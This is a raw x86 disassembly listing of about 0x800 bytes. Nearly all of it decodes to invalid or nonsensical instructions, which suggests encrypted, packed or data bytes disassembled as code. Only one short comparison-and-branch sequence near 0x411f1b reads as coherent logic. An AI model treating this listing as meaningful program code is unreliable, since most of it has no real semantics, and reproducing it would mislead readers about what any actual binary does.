  411cb9:	sti    
  411cba:	mov    cl,0x9c
  411cbc:	pop    edi
  411cbd:	(bad)
  411cc0:	pushf  
  411cc1:	mov    ecx,0x5449f341
  411cc6:	sar    DWORD PTR [esi],1
  411cc8:	stos   DWORD PTR es:[edi],eax
  411cc9:	pop    es
  411cca:	imul   eax,DWORD PTR [ecx+0x430d6bb1],0xd7e9bfe4
  411cd4:	jecxz  0x411cf4
  411cd6:	pop    ds
  411cd7:	enter  0xcac8,0x29
  411cdb:	pop    esp
  411cdc:	sub    dl,BYTE PTR [eax+0x65edda5d]
  411ce2:	(bad)  
  411ce3:	rcr    DWORD PTR [esi+0x7b],cl
  411ce6:	cmp    ah,cl
  411ce8:	imul   eax,DWORD PTR [esi-0x4e],0x89364a42
  411cef:	dec    edi
  411cf0:	(bad)  
  411cf2:	add    eax,0xd682567
  411cf7:	or     al,0x39
  411cf9:	pop    esi
  411cfa:	mul    BYTE PTR [eax-0x5dbf5165]
  411d00:	ret    0x2d96
  411d03:	dec    edx
  411d04:	outs   dx,DWORD PTR ds:[esi]
  411d05:	dec    ebp
  411d06:	push   es
  411d07:	outs   dx,DWORD PTR ds:[esi]
  411d08:	test   eax,0x3080af26
  411d0d:	sub    BYTE PTR [edx-0x1271bfef],dl
  411d13:	mov    ah,0xa8
  411d15:	nop
  411d16:	nop
  411d17:	mov    dl,0x12
  411d19:	push   ebx
  411d1a:	fs mov esp,0x45c04a47
  411d20:	push   ecx
  411d21:	sub    bl,BYTE PTR [edi-0x7dc7b2e5]
  411d27:	lods   eax,DWORD PTR ds:[esi]
  411d28:	mov    ebx,0xd044c412
  411d2d:	(bad)  
  411d2e:	in     al,0x45
  411d30:	es pop di
  411d33:	jecxz  0x411d94
  411d35:	test   eax,0xa176eb4a
  411d3a:	sub    cl,bl
  411d3c:	lds    edi,FWORD PTR [edx]
  411d3e:	test   al,0x90
  411d40:	or     al,BYTE PTR [ebx-0x27]
  411d43:	pop    eax
  411d44:	xor    esp,DWORD PTR [ecx-0x4b]
  411d47:	bound  esi,QWORD PTR [ebx+0x4f]
  411d4a:	sbb    ah,BYTE PTR ds:0x73f08d4
  411d50:	into   
  411d51:	mov    bl,0x6e
  411d53:	int3   
  411d54:	imul   eax,DWORD PTR [edi-0xa],0xa
  411d58:	cmp    ebp,DWORD PTR [edi+esi*4+0x7f]
  411d5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d5d:	es sahf 
  411d5f:	aas    
  411d60:	mov    dh,0xd3
  411d62:	(bad)  
  411d63:	mov    cl,0x49
  411d65:	mov    ecx,db0
  411d68:	pop    ss
  411d69:	push   0xbb686b9b
  411d6e:	push   0x42
  411d70:	dec    eax
  411d71:	(bad)  
  411d72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d73:	mov    ds:0x26c7407b,al
  411d78:	es popa 
  411d7a:	out    0xae,al
  411d7c:	push   edx
  411d7d:	hlt    
  411d7e:	nop
  411d7f:	ficomp DWORD PTR [ecx-0x57]
  411d82:	push   ebx
  411d83:	(bad)  
  411d84:	fwait
  411d85:	add    al,0x3d
  411d87:	dec    ecx
  411d88:	ret    
  411d89:	pusha  
  411d8a:	jl     0x411d94
  411d8c:	sbb    al,0x43
  411d8e:	pusha  
  411d8f:	ja     0x411d45
  411d91:	jmp    0x86809a09
  411d96:	aaa    
  411d97:	sahf   
  411d98:	outs   dx,DWORD PTR ds:[esi]
  411d99:	in     al,dx
  411d9a:	lds    edx,FWORD PTR [ecx+0x354f2d96]
  411da0:	ins    BYTE PTR es:[edi],dx
  411da1:	push   ebx
  411da2:	sbb    esi,eax
  411da4:	adc    BYTE PTR [ebp+0x4ed6fc40],0x78
  411dab:	mov    ah,0x3c
  411dad:	push   ebx
  411dae:	and    esp,esp
  411db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411db1:	js     0x411d84
  411db3:	pop    ds
  411db4:	cli    
  411db5:	adc    ecx,DWORD PTR [eax]
  411db7:	cmp    DWORD PTR ds:0xc1e01876,0x17b7fdcf
  411dc1:	sbb    eax,DWORD PTR [ebx]
  411dc3:	inc    edi
  411dc4:	jmp    0xe410a6fc
  411dc9:	adc    ebx,DWORD PTR [ecx+0x70a44f93]
  411dcf:	mov    dl,0x82
  411dd1:	and    eax,0x573e0d6b
  411dd6:	mov    eax,ss
  411dd8:	add    al,BYTE PTR [ecx]
  411dda:	xor    dh,BYTE PTR [ebx-0x2f]
  411ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411dde:	jne    0x411daf
  411de0:	fisttp DWORD PTR [edi-0x5b]
  411de3:	sbb    eax,0xe0eb5ceb
  411de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411de9:	out    dx,al
  411dea:	mov    ecx,0x3846b659
  411def:	pop    edi
  411df0:	fdiv   QWORD PTR [ecx-0x42]
  411df3:	into   
  411df4:	xchg   edi,eax
  411df5:	pop    eax
  411df6:	mov    ebx,DWORD PTR [ecx+0x2d]
  411df9:	cdq    
  411dfa:	mov    ds:0x27a9c940,al
  411dff:	and    al,0xdd
  411e01:	adc    BYTE PTR [esi],dh
  411e03:	and    BYTE PTR [ebp+0x6],bl
  411e06:	cmp    BYTE PTR ds:0xae155b89,0x64
  411e0d:	sbb    DWORD PTR [esi+0x44b58b03],esi
  411e13:	dec    esp
  411e14:	xchg   DWORD PTR [esi+0xe],esi
  411e17:	mov    ecx,0xd46c7cbd
  411e1c:	mov    eax,ds:0xc3ee5ac2
  411e21:	pushf  
  411e22:	mov    edi,eax
  411e24:	add    ecx,DWORD PTR [ebx+0x4f]
  411e27:	outs   dx,BYTE PTR ds:[esi]
  411e28:	pop    ecx
  411e29:	dec    edi
  411e2a:	push   ecx
  411e2b:	or     al,0xf4
  411e2d:	xor    al,0x4
  411e2f:	adc    eax,0x7041af44
  411e34:	data16 (bad) [ebx+0x21]
  411e38:	xor    edi,0x46
  411e3b:	frstor [ecx]
  411e3d:	popa   
  411e3e:	(bad)  
  411e3f:	clc    
  411e40:	hlt    
  411e41:	cmp    BYTE PTR [edx-0x58881c66],ah
  411e47:	call   0xe218b767
  411e4c:	(bad)  
  411e4d:	jg     0x411e09
  411e4f:	aas    
  411e50:	xor    eax,0x7374da48
  411e55:	xor    al,bh
  411e57:	clc    
  411e58:	cmovl  ebp,DWORD PTR [ebp+0x14a02b38]
  411e5f:	inc    ecx
  411e60:	hlt    
  411e61:	sub    edx,DWORD PTR [ebx+0x5b18831b]
  411e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e68:	mov    ch,0xe1
  411e6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e6b:	jmp    0xf01a:0x126d331f
  411e72:	and    cl,0xdf
  411e75:	rcr    DWORD PTR [eax+0xc],cl
  411e78:	jmp    0x9bb1:0x34e20c22
  411e7f:	sbb    ch,bl
  411e81:	mov    ebp,DWORD PTR [ecx]
  411e83:	enter  0xeea7,0xe3
  411e87:	mov    dl,0x83
  411e89:	cli    
  411e8a:	xor    BYTE PTR [ecx-0x425d13ea],ah
  411e90:	lahf   
  411e91:	jae    0x411e59
  411e93:	add    eax,0xff5c3583
  411e98:	fnstenv [ecx+0x4a]
  411e9b:	sbb    bh,BYTE PTR [eax+0x72]
  411e9e:	ss push ss
  411ea0:	add    BYTE PTR [edi],dl
  411ea2:	imul   esi
  411ea4:	push   ecx
  411ea5:	mov    dl,0xf
  411ea7:	in     eax,0x55
  411ea9:	cmp    cl,dh
  411eab:	sbb    BYTE PTR [esi-0x1f],ch
  411eae:	xchg   ebx,eax
  411eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eb0:	out    dx,eax
  411eb1:	pop    eax
  411eb2:	xchg   edx,eax
  411eb3:	jno    0x411e89
  411eb5:	out    dx,al
  411eb6:	dec    esp
  411eb7:	into   
  411eb8:	and    esp,DWORD PTR ds:0x84fa2cd9
  411ebe:	in     al,0xec
  411ec0:	sbb    BYTE PTR [edx+0x5f],ah
  411ec3:	add    edx,DWORD PTR cs:[ecx-0x30592a5a]
  411eca:	add    BYTE PTR [ebp+0x74],0xca
  411ece:	or     eax,0x342a6cdc
  411ed3:	stos   DWORD PTR es:[edi],eax
  411ed4:	xor    DWORD PTR [eax+ebp*8+0x2e93b6b],esi
  411edb:	mov    dh,0xa0
  411edd:	cmc    
  411ede:	pop    edi
  411edf:	ja     0x411ed4
  411ee1:	out    dx,eax
  411ee2:	dec    ebx
  411ee3:	out    dx,eax
  411ee4:	dec    edi
  411ee5:	xor    al,0xe8
  411ee7:	test   eax,0x970bd3e9
  411eec:	jg     0x411edf
  411eee:	mov    al,ds:0x4919aa3d
  411ef3:	adc    eax,0xb91f2c1f
  411ef8:	dec    edx
  411ef9:	(bad)  
  411efa:	fist   DWORD PTR [ebx-0x4b719d7b]
  411f00:	and    BYTE PTR [ecx-0x75d4d92d],bh
  411f06:	push   esp
  411f07:	ja     0x411eaa
  411f09:	push   ss
  411f0a:	mov    ebx,0xe0c195be
  411f0f:	add    cl,BYTE PTR [ecx+0x558b1055]
  411f15:	lods   al,BYTE PTR ds:[esi]
  411f16:	xor    eax,0xba699573
  411f1b:	mov    DWORD PTR [ebp+0x14],edx
  411f1e:	cmp    eax,DWORD PTR [ebp+0x10]
  411f21:	jne    0x416379
  411f27:	mov    eax,edx
  411f29:	cmp    DWORD PTR [ebp+0xc],eax
  411f2c:	jne    0x416379
  411f32:	mov    DWORD PTR [ebp+0x8],0xba699573
  411f39:	jmp    0x4124c3
  411f3e:	(bad)  
  411f3f:	repz mov al,ds:0x46199861
  411f45:	sbb    dh,cl
  411f47:	jmp    0xec75cdc2
  411f4c:	pop    ss
  411f4d:	je     0x411f74
  411f4f:	xor    BYTE PTR [esi],dl
  411f51:	push   ss
  411f52:	cmp    eax,0xbb161604
  411f57:	pop    esp
  411f58:	inc    edx
  411f59:	in     al,0x7d
  411f5b:	addr16 pop edx
  411f5d:	jmp    0x2f6e09b9
  411f62:	or     al,0xdd
  411f64:	xor    BYTE PTR [esi+0xc],al
  411f67:	xchg   esi,eax
  411f68:	jnp    0x411f05
  411f6a:	call   0xb782a8d7
  411f6f:	mov    cl,0xc6
  411f71:	inc    ebx
  411f72:	push   0xffffffc3
  411f74:	xchg   ebp,eax
  411f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f76:	dec    esp
  411f77:	out    0xb9,al
  411f79:	jne    0x411fdf
  411f7b:	add    eax,0xf883cacc
  411f80:	bound  ebp,QWORD PTR [esp+ecx*2]
  411f83:	ret    0xbcd4
  411f86:	jge    0x411fa8
  411f88:	xor    al,0xcf
  411f8a:	push   0x1a
  411f8c:	mov    eax,0x22f018e5
  411f91:	cmp    al,0x25
  411f93:	jmp    0x411fee
  411f95:	loopne 0x411f1d
  411f97:	dec    eax
  411f98:	lock push esi
  411f9a:	xchg   ebx,eax
  411f9b:	cmp    al,0x30
  411f9d:	mov    al,0xea
  411f9f:	mov    WORD PTR [edi+0x59],ss
  411fa2:	test   al,0xf0
  411fa4:	pop    ds
  411fa5:	mov    edi,0xe7d8aab4
  411faa:	and    edi,DWORD PTR [ecx]
  411fac:	cmp    BYTE PTR [ecx+0x47d78863],ah
  411fb2:	mov    edi,es
  411fb4:	js     0x411f57
  411fb6:	push   es
  411fb7:	pusha  
  411fb8:	js     0x412012
  411fba:	xor    esi,DWORD PTR [eax-0x1562623d]
  411fc0:	inc    eax
  411fc1:	lods   al,BYTE PTR gs:[esi]
  411fc3:	push   ebx
  411fc4:	into   
  411fc5:	fild   WORD PTR [edx+0x9]
  411fc8:	adc    eax,0x27000c5f
  411fcd:	or     al,0x6f
  411fcf:	movntq (bad),mm4
  411fd0:	out    0xe4,eax
  411fd2:	xor    BYTE PTR [ecx-0x21],al
  411fd5:	and    eax,0x105874c9
  411fda:	lea    edi,[ebp+0x18d70692]
  411fe0:	inc    ecx
  411fe1:	xchg   edx,eax
  411fe2:	or     BYTE PTR [ecx+ebp*8+0x54],dl
  411fe6:	(bad)  
  411fe7:	cmc    
  411fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fe9:	sar    BYTE PTR [eax+esi*4],1
  411fec:	mov    cl,0x5
  411fee:	(bad)  
  411fef:	ret    
  411ff0:	stos   BYTE PTR es:[edi],al
  411ff1:	dec    ebp
  411ff2:	test   eax,0x3ad1b8f2
  411ff7:	sbb    al,0x3a
  411ff9:	mov    edi,DWORD PTR [esi]
  411ffb:	sti    
  411ffc:	pusha  
  411ffd:	nop
  411ffe:	loop   0x411fa4
  412000:	cs push 0xffffffc8
  412003:	inc    ebx
  412004:	add    BYTE PTR [esi],cl
  412006:	cmovg  esi,DWORD PTR [ebx-0x6b4604f9]
  41200d:	push   eax
  41200f:	aaa    
  412010:	fst    QWORD PTR [edi]
  412012:	pop    edi
  412013:	fwait
  412014:	(bad)
  412018:	daa    
  412019:	or     ecx,0xfffffff6
  41201c:	test   DWORD PTR [edi+eiz*1-0x3d365a4b],0x8b44a1ee
  412027:	in     eax,0x47
  412029:	repz or bl,BYTE PTR [ecx+0x377fcf51]
  412030:	(bad)  
  412031:	jb     0x41200c
  412033:	mov    eax,0xb6961782
  412038:	add    al,ah
  41203a:	(bad)  [edx+eiz*2]
  41203d:	test   al,0x53
  41203f:	cs fsin 
  412042:	rcl    DWORD PTR [edi],cl
  412044:	sub    eax,0xb0b83eff
  412049:	shl    BYTE PTR [ebx],cl
  41204b:	loope  0x412045
  41204d:	das    
  41204e:	out    0xe5,eax
  412050:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412051:	push   edi
  412052:	in     al,dx
  412053:	xchg   DWORD PTR [eax+0x1e2a772c],edi
  412059:	pop    esp
  41205a:	mov    WORD PTR [edx+ebx*1],ds
  41205d:	and    bh,BYTE PTR [eax+0x54]
  412060:	mov    dl,0x86
  412062:	test   eax,0xe7e470e0
  412067:	jmp    0x4386c122
  41206c:	or     DWORD PTR [edx],eax
  41206e:	adc    DWORD PTR [esi],ecx
  412070:	pop    ds
  412071:	stc    
  412072:	sub    eax,0x7f3d404e
  412077:	pop    ecx
  412078:	pop    es
  412079:	mov    eax,0xeeca8448
  41207e:	(bad)  
  41207f:	xchg   edi,eax
  412080:	mov    eax,cs
  412082:	lock (bad) 
  412084:	test   eax,0x3308aefb
  412089:	(bad)  
  41208a:	call   0xd7a0eac0
  41208f:	loopne 0x4120a2
  412091:	adc    al,0x7f
  412093:	ror    DWORD PTR [esi],cl
  412095:	dec    ebp
  412096:	mov    dl,0xac
  412098:	clc    
  412099:	push   cs
  41209a:	or     edx,DWORD PTR [eax]
  41209c:	pop    edx
  41209d:	dec    edi
  41209e:	imul   ecx,DWORD PTR [edx-0x7e],0x6c9b27d4
  4120a5:	pop    es
  4120a6:	pop    es
  4120a7:	fnstenv [ebx+0x1b7cfa73]
  4120ad:	inc    eax
  4120ae:	in     eax,dx
  4120af:	arpl   WORD PTR [edi-0x4d8627cc],ax
  4120b5:	ins    DWORD PTR es:[edi],dx
  4120b6:	mov    al,ds:0xb36923b
  4120bb:	ss cld 
  4120bd:	or     eax,0x4bfcb402
  4120c2:	adc    edi,edi
  4120c4:	lock lods al,BYTE PTR ds:[esi]
  4120c6:	inc    esi
  4120c7:	(bad)  
  4120c8:	mov    ds,esp
  4120ca:	mov    al,0xa2
  4120cc:	inc    edi
  4120cd:	or     dl,BYTE PTR [edi]
  4120cf:	mov    bl,0xf1
  4120d1:	dec    edx
  4120d2:	add    eax,0xfc836f13
  4120d7:	icebp  
  4120d8:	and    DWORD PTR [esi+0x2106e253],edi
  4120de:	xchg   ebx,eax
  4120df:	es test eax,0xc814af3e
  4120e5:	cmp    BYTE PTR [ecx],ch
  4120e7:	and    DWORD PTR [ecx],esi
  4120e9:	fneni(8087 only) 
  4120eb:	push   ebp
  4120ec:	ja     0x4120dc
  4120ee:	retf   0xdc1a
  4120f1:	push   ds
  4120f2:	pop    esp
  4120f3:	sar    BYTE PTR [eax+edx*2-0x11],1
  4120f7:	pop    ss
  4120f8:	shl    DWORD PTR [ebp+0x0],cl
  4120fb:	sbb    eax,0x3ef81d94
  412100:	sar    BYTE PTR [edi],cl
  412102:	in     eax,dx
  412103:	xor    al,0xc9
  412105:	and    DWORD PTR [ecx+0x7fead210],eax
  41210b:	jne    0x412168
  41210d:	and    esi,DWORD PTR [eax-0x1e6e0b48]
  412113:	lock mov dh,0x8c
  412116:	mov    eax,ds:0x85d309f7
  41211b:	adc    esi,DWORD PTR [eax+0x27]
  41211e:	inc    ebp
  41211f:	dec    esi
  412120:	jno    0x4120c6
  412122:	pusha  
  412123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412124:	dec    ecx
  412125:	out    0xfd,al
  412127:	pop    ss
  412128:	call   0x974c:0x29b99d9f
  41212f:	mov    ch,0xd8
  412131:	adc    eax,0x1395e2d3
  412136:	jo     0x412198
  412138:	(bad)  
  412139:	test   DWORD PTR [edx+esi*8],0x1fe75f9f
  412140:	lea    ebp,[edx-0x79a813af]
  412146:	fild   DWORD PTR [ecx+0x52]
  412149:	push   cs
  41214a:	push   esp
  41214b:	jb     0x4121b8
  41214d:	inc    esp
  41214e:	bsf    esi,DWORD PTR [edx-0x78aa91d1]
  412155:	mov    ebp,0xacd534e2
  41215a:	adc    al,0xa4
  41215c:	adc    dl,dl
  41215e:	adc    BYTE PTR [edi],dl
  412160:	nop
  412161:	test   BYTE PTR [eax],0xa0
  412164:	mov    ecx,0x290359fd
  412169:	xor    edi,eax
  41216b:	pusha  
  41216c:	xchg   ebp,eax
  41216d:	ror    BYTE PTR [ecx],1
  41216f:	div    BYTE PTR [edi+esi*1-0x1]
  412173:	mov    al,0xad
  412175:	fnstcw WORD PTR [edx-0x1edfbdac]
  41217b:	ins    BYTE PTR es:[edi],dx
  41217c:	jl     0x412173
  41217e:	and    esi,DWORD PTR [eax+0x62822402]
  412184:	pusha  
  412185:	out    dx,al
  412186:	mov    edx,0x7ca54fa6
  41218b:	push   ebp
  41218c:	add    DWORD PTR [esi],edx
  41218e:	pop    eax
  41218f:	or     al,dh
  412191:	mov    BYTE PTR [ebx-0x4b2153f7],al
  412197:	test   BYTE PTR [ebx-0x26],dh
  41219a:	in     eax,0xda
  41219c:	jbe    0x412176
  41219e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41219f:	shl    BYTE PTR [ebp+0xc],1
  4121a2:	out    dx,eax
  4121a3:	adc    DWORD PTR [ecx+edi*2-0x4e],0xffffffbb
  4121a8:	inc    ebx
  4121a9:	adc    al,0x94
  4121ab:	pop    esi
  4121ac:	aas    
  4121ad:	mov    WORD PTR [eax-0x43d659ac],ss
  4121b3:	in     eax,dx
  4121b4:	sub    BYTE PTR [eax+0x56],dh
  4121b7:	loope  0x41222f
  4121b9:	add    al,0x18
  4121bb:	mov    BYTE PTR [edi+0x1e],bl
  4121be:	add    esp,ecx
  4121c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c1:	nop
  4121c2:	pop    edx
  4121c3:	mov    cl,BYTE PTR [ebx+esi*1-0x57f706ce]
  4121ca:	imul   eax,DWORD PTR [esi+eax*1-0x59],0x2
  4121cf:	sub    al,0xca
  4121d1:	xor    cl,BYTE PTR [edi+0x6a634865]
  4121d7:	push   0xa2a0208c
  4121dc:	xchg   ebp,eax
  4121dd:	adc    ebx,DWORD PTR [ebx+eiz*2-0x66]
  4121e1:	jno    0x4121c2
  4121e3:	inc    esi
  4121e4:	popf   
  4121e5:	dec    BYTE PTR [edx]
  4121e7:	retf   0xf8a5
  4121ea:	mul    BYTE PTR [ebx+0x7e802b2e]
  4121f0:	scas   eax,DWORD PTR es:[edi]
  4121f1:	jmp    0x9ac3c3e3
  4121f6:	and    BYTE PTR [edx-0x23],dl
  4121f9:	ins    BYTE PTR es:[edi],dx
  4121fa:	and    BYTE PTR [edi+0x1],bl
  4121fd:	(bad)  
  4121fe:	dec    esi
  4121ff:	lods   eax,DWORD PTR ds:[esi]
  412200:	pusha  
  412201:	jg     0x4121ea
  412203:	hlt    
  412204:	outs   dx,BYTE PTR ds:[esi]
  412205:	out    dx,al
  412206:	add    eax,0x356f301d
  41220b:	inc    ebp
  41220c:	addr16 out dx,eax
  41220e:	sbb    DWORD PTR [edx-0x1],eax
  412211:	mov    esp,0x263bc27c
  412216:	in     al,dx
  412217:	jmp    0x5fcfa2dd
  41221c:	iret   
  41221d:	ret    0xfd08
  412220:	repz add al,0x6c
  412223:	jns    0x4121a7
  412225:	sti    
  412226:	(bad)  
  412228:	jle    0x4121f7
  41222a:	sar    BYTE PTR [ecx-0x3b],0xd2
  41222e:	pusha  
  41222f:	(bad)  
  412231:	add    BYTE PTR [edi],dl
  412233:	icebp  
  412234:	cmp    eax,0x10016660
  412239:	or     edx,DWORD PTR [ebx]
  41223b:	xor    ch,0x16
  41223e:	mov    ch,0x7
  412240:	xchg   esi,eax
  412241:	sbb    eax,eax
  412243:	loopne 0x41225a
  412245:	fdiv   QWORD PTR [edx-0x65]
  412248:	xor    eax,0x6370d612
  41224d:	mov    edx,0x7cd2f902
  412252:	jmp    0x41220e
  412254:	lock int 0x2a
  412257:	xchg   dh,cl
  412259:	add    al,0x25
  41225b:	fdiv   st(7),st
  41225d:	sub    dh,ah
  41225f:	lahf   
  412260:	aad    0x8d
  412262:	sbb    ch,BYTE PTR [ebx-0x5]
  412265:	add    BYTE PTR [edx+0x6cfc3481],0x2c
  41226c:	cmp    al,0xc3
  41226e:	and    bh,BYTE PTR [ebx-0x58161b7a]
  412274:	and    ecx,edi
  412276:	clc    
  412277:	bound  ebp,QWORD PTR [esi]
  412279:	mov    edx,0x49132653
  41227e:	jb     0x412200
  412280:	enter  0xbbee,0x74
  412284:	loop   0x4122a8
  412286:	adc    ecx,DWORD PTR ds:0xc65f90d1
  41228c:	mov    WORD PTR ss:[eax-0x7a],?
  412290:	lahf   
  412291:	jge    0x412228
  412293:	in     eax,dx
  412294:	xchg   esp,eax
  412295:	dec    esp
  412296:	add    DWORD PTR [ebx+0x5b301071],ebp
  41229c:	add    eax,0x63cc9433
  4122a1:	and    BYTE PTR [edi],ah
  4122a3:	push   ebp
  4122a4:	mov    al,0x66
  4122a6:	mov    ebx,0x6cc22f85
  4122ab:	pop    eax
  4122ac:	mov    edx,0x5e22b62b
  4122b1:	int    0x29
  4122b3:	inc    ecx
  4122b4:	adc    esi,DWORD PTR [esi-0x72]
  4122b7:	pop    eax
  4122b8:	mov    edi,0x99da2faf
  4122bd:	inc    edx
  4122be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122bf:	dec    ecx
  4122c0:	mov    ch,0x33
  4122c2:	bnd ret 
  4122c4:	sahf   
  4122c5:	fld    DWORD PTR [ecx+0x719a2163]
  4122cb:	adc    esp,DWORD PTR [eax+ebx*1]
  4122ce:	sub    bl,cl
  4122d0:	int    0x9
  4122d2:	mov    ebp,0xd506a4f6
  4122d7:	mov    eax,0xeced0cfa
  4122dc:	outs   dx,DWORD PTR ds:[esi]
  4122dd:	mov    bh,0x4b
  4122df:	inc    edi
  4122e0:	dec    edi
  4122e1:	dec    eax
  4122e2:	mov    edx,0x74d0ce2
  4122e7:	sbb    DWORD PTR [edi],ecx
  4122e9:	mov    ebp,0x1ece66db
  4122ee:	xor    al,0x1d
  4122f0:	div    DWORD PTR [eax]
  4122f2:	mov    ds:0x24819b1a,eax
  4122f7:	fimul  WORD PTR [eax+0x4d]
  4122fa:	mov    esp,0x4e256b99
  4122ff:	mov    al,al
  412301:	jnp    0x4122df
  412303:	and    ecx,0xbaf31714
  412309:	or     eax,0x73d6935f
  41230e:	cmp    DWORD PTR [ebp+0x7b],edx
  412311:	leave  
  412312:	(bad)  
  412313:	sbb    dh,bl
  412315:	stos   DWORD PTR es:[edi],eax
  412316:	sub    DWORD PTR [ebx+0x51fa2b2f],esp
  41231c:	mov    edi,0x5285005c
  412321:	xchg   ebx,eax
  412322:	test   DWORD PTR [edx],0x56038b46
  412328:	sub    ah,BYTE PTR [esi+0x23a41976]
  41232e:	and    DWORD PTR [edx+edi*1+0xd],ecx
  412332:	repnz mov ebp,0xbcf08e93
  412338:	and    dl,al
  41233a:	pop    ss
  41233b:	push   ebx
  41233c:	fwait
  41233d:	inc    eax
  41233e:	sub    BYTE PTR [edi],bh
  412340:	adc    al,0x29
  412342:	cmp    edx,esi
  412344:	clc    
  412345:	pop    esi
  412346:	bnd je 0x412339
  412349:	fnsave [edx-0x6949edeb]
  41234f:	daa    
  412350:	(bad)  
  412351:	cmp    DWORD PTR [ebp+0x25],esi
  412354:	rcr    DWORD PTR [ebp+0x4f],cl
  412357:	pop    esi
  412358:	push   ss
  412359:	test   DWORD PTR [ecx+ebx*4+0x6a52b17e],esp
  412360:	in     al,0x28
  412362:	jecxz  0x412350
  412364:	mov    ch,0x4a
  412366:	call   0xe6a732ea
  41236b:	ret    
  41236c:	inc    eax
  41236d:	dec    esi
  41236e:	adc    al,0x6b
  412370:	pop    ss
  412371:	jle    0x412397
  412373:	mov    esp,0xebdee72
  412378:	neg    DWORD PTR [eax]
  41237a:	xchg   edx,eax
  41237b:	fidiv  WORD PTR [ebp-0x56914df]
  412381:	cmp    ebx,DWORD PTR [eax+0x47c05a05]
  412387:	pop    edx
  412388:	add    eax,0x6b325a8d
  41238d:	xchg   edi,eax
  41238e:	and    al,0x60
  412390:	add    ebp,DWORD PTR [ecx+edi*8]
  412393:	lds    ebp,FWORD PTR [edx-0x47]
  412396:	stc    
  412397:	mov    eax,0xf7f74a0b
  41239c:	cmp    DWORD PTR ds:0x524e9000,ebp
  4123a2:	cmp    eax,0xf923e6cd
  4123a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123a8:	shl    BYTE PTR [ecx+0xa482f41],cl
  4123ae:	inc    ebp
  4123af:	jno    0x412414
  4123b1:	aaa    
  4123b2:	and    al,0x15
  4123b4:	lds    ebp,FWORD PTR [edx]
  4123b6:	push   eax
  4123b7:	mov    esp,0xb86169a8
  4123bc:	mov    ch,0xa9
  4123be:	hlt    
  4123bf:	dec    ebx
  4123c0:	test   eax,0x6ef7054b
  4123c5:	nop
  4123c6:	cmp    eax,0xff198ce4
  4123cb:	fs jo  0x4123a9
  4123ce:	ins    DWORD PTR es:[edi],dx
  4123cf:	mov    eax,ds:0x48ad2cc4
  4123d4:	jns    0x4123e0
  4123d6:	pop    es
  4123d7:	es sahf 
  4123d9:	xor    BYTE PTR [esi-0x55],cl
  4123dc:	nop
  4123dd:	xchg   ebp,esp
  4123df:	mov    al,ds:0x21e8c81d
  4123e4:	push   edx
  4123e5:	push   eax
  4123e6:	jmp    0x6955156a
  4123eb:	push   0xf3dccc05
  4123f0:	imul   eax,esi,0xb910afa7
  4123f6:	bound  edi,QWORD PTR [edx]
  4123f8:	(bad)  
  4123f9:	fnstcw WORD PTR [ecx-0xe]
  4123fc:	ret    0x54a2
  4123ff:	xor    BYTE PTR [edx],al
  412401:	ror    DWORD PTR [esi-0x4f953f37],cl
  412407:	loopne 0x4123ca
  412409:	dec    edi
  41240a:	xor    DWORD PTR [edi-0x46],edi
  41240d:	inc    ebx
  41240e:	icebp  
  41240f:	cdq    
  412410:	shr    DWORD PTR [eax-0x6d8ca5b],cl
  412416:	nop
  412417:	or     al,0x8a
  412419:	sbb    esi,DWORD PTR [ebx]
  41241b:	xchg   ebp,eax
  41241c:	xor    eax,0x35320e2f
  412421:	outs   dx,BYTE PTR ds:[esi]
  412422:	pop    eax
  412423:	sub    al,0x6a
  412425:	mov    ebp,0x5609b740
  41242a:	cs (bad) 
  41242c:	and    BYTE PTR [edx+0x60],0xf3
  412430:	lss    ebp,FWORD PTR [ecx-0x35af1f73]
  412437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412438:	add    al,0xd6
  41243a:	pop    ss
  41243b:	mov    al,ds:0xb6a2ff81
  412440:	dec    edx
  412441:	adc    ecx,DWORD PTR [ecx]
  412443:	lods   eax,DWORD PTR ds:[esi]
  412444:	and    DWORD PTR [edx-0x4e],eax
  412447:	imul   ah
  412449:	fnop   
  41244b:	popa   
  41244c:	sbb    dh,BYTE PTR [edx]
  41244e:	push   ecx
  41244f:	add    esp,DWORD PTR [ebx+0x3a]
  412452:	jno    0x4124af
  412454:	inc    edi
  412455:	call   0x21396f85
  41245a:	mov    dl,0x76
  41245c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245d:	jno    0x412479
  41245f:	out    0xbb,al
  412461:	iret   
  412462:	xorps  xmm7,XMMWORD PTR [eax+0x66f335ba]
  412469:	mov    ecx,ecx
  41246b:	outs   dx,DWORD PTR ds:[esi]
  41246c:	xchg   ebp,eax
  41246d:	stc    
  41246e:	fisub  DWORD PTR [ebp+0x30c6e309]
  412474:	inc    ecx
  412475:	jp     0x41240f
  412477:	ficom  DWORD PTR [ebp-0x5d]
  41247a:	mov    bh,0xa2
  41247c:	xchg   edi,eax
  41247d:	test   DWORD PTR [edx-0x11d1ef9],eax
  412483:	xor    bh,BYTE PTR [ecx+0x73244ddb]
  412489:	inc    edi
  41248a:	lock lods al,BYTE PTR ds:[esi]
  41248c:	arpl   WORD PTR [ecx],bp
  41248e:	aam    0xeb
  412490:	je     0x412423
  412492:	xchg   DWORD PTR [ecx-0x45168d75],eax
  412498:	add    eax,0x40864bf9
  41249d:	and    BYTE PTR [edx+0xa],bl
  4124a0:	retf   0x7de3
  4124a3:	je     0x41242a
  4124a5:	ds jmp 0xd26e:0x72a353e7
  4124ad:	dec    ecx
  4124ae:	xchg   edi,eax
  4124af:	jg     0x412521
  4124b1:	adc    al,0xcf
